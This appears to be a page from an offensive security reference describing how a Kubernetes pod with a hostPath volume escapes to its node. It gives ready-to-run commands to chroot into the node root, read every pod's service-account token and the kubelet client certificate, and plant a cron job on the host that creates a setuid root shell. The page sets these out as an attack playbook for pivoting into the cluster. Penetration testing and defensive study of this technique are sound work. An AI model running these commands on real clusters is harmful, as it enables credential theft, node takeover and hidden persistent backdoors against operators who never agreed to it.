---
title: "hostPath mount: node access through a mounted node directory"
description: "A pod with a hostPath volume mounts a directory from the worker node into the container. Depending on the path, this exposes the node root filesystem, the kubelet credentials and pod token directories, the container runtime socket, or the host /etc, each giving node compromise without any capability or exploit."
keywords:
  - hostpath
  - kubernetes volume
  - node filesystem
  - kubelet
  - node takeover
---

# hostPath mount

A `hostPath` volume maps a directory from the node into the pod, and the files behind it are the node's real files. It is one of the most common pod-to-node escapes because many legitimate workloads request a hostPath for logs, sockets, or device access, and an over-broad path hands the node to the pod. The severity is set by which path is mounted and whether it is writable.

Find the hostPath mount:

```bash
findmnt -o TARGET,SOURCE,OPTIONS | grep -vE 'overlay|tmpfs|proc|sysfs|cgroup'
# a SOURCE that is a node subtree (e.g. /var/lib/kubelet[...] or /) is a hostPath
cat /proc/self/mountinfo | grep -v overlay | head
```

## Routes by mounted path

```bash
# whole node root mounted: chroot straight in
chroot /host-root sh      # (mount target varies; use the one findmnt showed)

# /var/lib/kubelet: pod tokens and kubelet client certs
cat /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
cat /host/var/lib/kubelet/pki/kubelet-client-current.pem 2>/dev/null

# the runtime socket mounted in: launch a privileged container (node root)
ls -l /host/run/containerd/containerd.sock /host/var/run/docker.sock 2>/dev/null

# host /etc writable: cron or SSH key for node persistence
echo '* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /host-etc/cron.d/x
```

A mounted `/var/lib/kubelet` is especially potent: it contains every scheduled pod's projected service-account token, so reading them yields many cluster identities at once.

## Exploitation notes

- Enumerate the exact mount with `findmnt`; the source subtree tells you which route applies before you try anything.
- A hostPath of the container runtime socket is a node takeover via the socket, not a file route; see [Runtime socket mount](../../../container-escape/sensitive-mounts/runtime-socket-mount.md).
- A read-only hostPath still exposes node secrets and pod tokens; prioritise `/var/lib/kubelet` tokens and kubelet client certs for the cluster pivot.
- The general file-mount mechanics match the runtime-agnostic [Host path mount](../../../container-escape/sensitive-mounts/host-path-mount.md).

## References

- [Kubernetes: hostPath volumes](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath)
- [BishopFox: bad pods (hostPath)](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
